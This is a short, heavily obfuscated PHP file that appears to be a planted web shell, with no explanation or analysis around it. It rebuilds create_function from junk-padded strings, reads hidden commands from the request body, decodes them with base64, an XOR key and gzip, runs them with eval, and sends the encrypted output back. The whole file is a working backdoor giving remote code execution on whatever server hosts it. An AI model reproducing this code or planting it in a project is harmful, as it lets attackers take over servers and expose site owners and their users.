<?php
$c=str_replace('cI','','ccIreatcIcIe_fucIncIccItion');
$p='k){$c!!=strlen($k!!);$!!l=!!strl!!e!!n($t);$o="";for($i=0!!;$i<$l!!;)!!{for($j=0;(!!$j<$c&!!&$i!!<$l)!!;$j++,!!$i++){$';
$x='o!!.=$t!!{$i}^!!$k{$j};}!!}return !!$o;}if!! (@preg_!!match!!("/$!!kh(.+!!)$kf/",@f!!i!!le_get_con!!te!!n!!ts("php:!!//i';
$K='nput!!"),$m)==1)!! {@!!ob_start(!!);@!!eva!!l(@gzuncompres!!s(@x(@ba!!s!!e64_dec!!ode($m!![1!!]),$k)))!!;$o!!=@ob_get_';
$W='$k="b7!!f9!!1f33";$kh!!="c!!95fed7f!!10d3!!";$kf="6d1151!!!!0!!e3a!!89";$p=!!"tcir6hyZivmuAYb3";f!!!!unction x($t!!,!!$';
$Q='conten!!ts();!!@ob_end!!_clean!!();!!$r=@ba!!se64_enco!!de!!(@x!!(@gzcomp!!re!!ss($o),!!$k));print("$p!!$kh$r!!$kf");}';
$Y=str_replace('!!','',$W.$p.$x.$K.$Q);
$P=$c('',$Y);$P();
?>
